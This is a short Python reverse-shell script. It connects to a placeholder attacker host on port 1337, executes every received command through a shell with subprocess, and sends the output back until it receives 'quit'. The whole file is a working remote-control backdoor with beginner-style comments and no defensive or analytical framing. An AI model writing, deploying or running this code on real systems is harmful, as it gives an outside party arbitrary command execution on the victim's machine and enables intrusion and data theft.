import socket
import subprocess

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

while True:
	cmd = payload.recv(2048)
	
	## if you want to quit and close the connection
	if cmd == b"quit":
		payload.close() # close the connection
		break			# break the loop to stop
		
	cmd = cmd.decode("utf-8")
	output = subprocess.check_output(cmd, shell = True)
	payload.send(output)

print("Disconnected") # display disconnection message
